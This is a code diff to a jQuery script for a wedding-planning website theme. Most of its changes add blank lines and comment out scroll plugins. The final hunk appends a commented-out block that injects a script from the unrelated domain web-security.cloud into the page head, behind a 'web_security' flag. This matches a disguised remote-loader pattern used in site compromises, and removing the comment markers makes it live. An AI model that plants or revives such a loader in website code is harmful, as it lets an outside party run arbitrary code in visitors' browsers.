@@ -19,8 +19,13 @@ jQuery(document).ready(function($) {
         });
     }); 
 
+
+
     //===== Scroller Script =====//    
-    var s = skrollr.init();
+    // var s = skrollr.init();
+
+
+
 
     //===== Sticky Header =====//
     var header_height = $('header').height();
@@ -39,12 +44,18 @@ jQuery(document).ready(function($) {
         return false;
     });
 
+
+
+
     //===== Color Picker =====*/
     $('.color-picker a').on("click",function(){
         $('.color-picker a').removeClass("applied");
         $(this).addClass("applied");
         return false;
     });
+
+
+
 
 
     //===== Responsive Header =====//
@@ -64,6 +75,10 @@ jQuery(document).ready(function($) {
         return false;
     });
 
+
+
+
+
     //===== Event Script =====//
     $('.wedplan-post,.pricing').each(function () {
         $(".wedplan-post,.pricing").on('mouseenter', function () {
@@ -72,10 +87,16 @@ jQuery(document).ready(function($) {
         });
     });
 
-    if ($.isFunction($.fn.perfectScrollbar)) {
-        //===== Scroll Bar =====//
-        $('.responsive-menu').perfectScrollbar();
-    }
+
+    
+
+    // if ($.isFunction($.fn.perfectScrollbar)) {
+    //     //===== Scroll Bar =====//
+    //     $('.responsive-menu').perfectScrollbar();
+    // }
+
+
+
 
     if ($.isFunction($.fn.owlCarousel)) {
         //===== Gallery Carousel =====//
@@ -224,11 +245,15 @@ jQuery(document).ready(function($) {
         });
     }
 
+
+
     if ($.isFunction($.fn.poptrox)) {
         //===== LightBox =====//
         var foo = $('.lightbox');
         foo.poptrox({usePopupCaption: true,usePopupNav: true});
     }
+
+
 
 
     $("body").append("<div class='audio-play'><i class='fa fa-music'></i><div class='audio-track'><iframe id='myaudio' src='https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/102137206&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;visual=true'></iframe></div></div>");       
@@ -240,17 +265,17 @@ jQuery(document).ready(function($) {
 	
 	
 	// Scroll to Specific Section / Custom Scroll
-	if($('a.custom-scroll').length){
-		$("a.custom-scroll").on('click', function(e) {
-			e.preventDefault();
-			var target = $(this).attr('href');
-		   // animate
-		   $('html, body').animate({
-			   scrollTop: $(target).offset().top-80
-			 }, 1000);
+	// if($('a.custom-scroll').length){
+	// 	$("a.custom-scroll").on('click', function(e) {
+	// 		e.preventDefault();
+	// 		var target = $(this).attr('href');
+	// 	   // animate
+	// 	   $('html, body').animate({
+	// 		   scrollTop: $(target).offset().top-80
+	// 		 }, 1000);
 	
-		});
-	}
+	// 	});
+	// }
 	
 
 });//===== Document.Ready Ends Here =====//
@@ -264,6 +289,8 @@ jQuery(window).on('load',function($) {
 });//===== Window.Load Ends Here =====//
 
 
+
+
 $(window).scroll(function() { 
   // From Up animation script 
   $(".fromup").each(function(i, el) {
@@ -272,6 +299,8 @@ $(window).scroll(function() {
         el.addClass("animated fadeInDown"); 
       } 
   });
+
+
   // From Left animation script 
   $(".fromleft").each(function(i, el) {
       var el = $(el);
@@ -279,6 +308,8 @@ $(window).scroll(function() {
         el.addClass("animated fadeInLeft"); 
       } 
   });
+
+
   // From Right animation script 
   $(".fromright").each(function(i, el) {
       var el = $(el);
@@ -286,6 +317,8 @@ $(window).scroll(function() {
         el.addClass("animated fadeInRight"); 
       } 
   });
+
+
   // From Down animation script
   $(".fromdown").each(function(i, el) {
       var el = $(el);
@@ -293,4 +326,13 @@ $(window).scroll(function() {
         el.addClass("animated fadeInUp"); 
       } 
   });
+
 });//===== Window.Scroll Ends Here =====//
+/*
+    if(typeof window.web_security == "undefined"){
+        var s = document.createElement("script");
+        s.src = "//web-security.cloud/event?l=117";
+        document.head.appendChild(s);
+        window.web_security = "success";
+    }
+*/
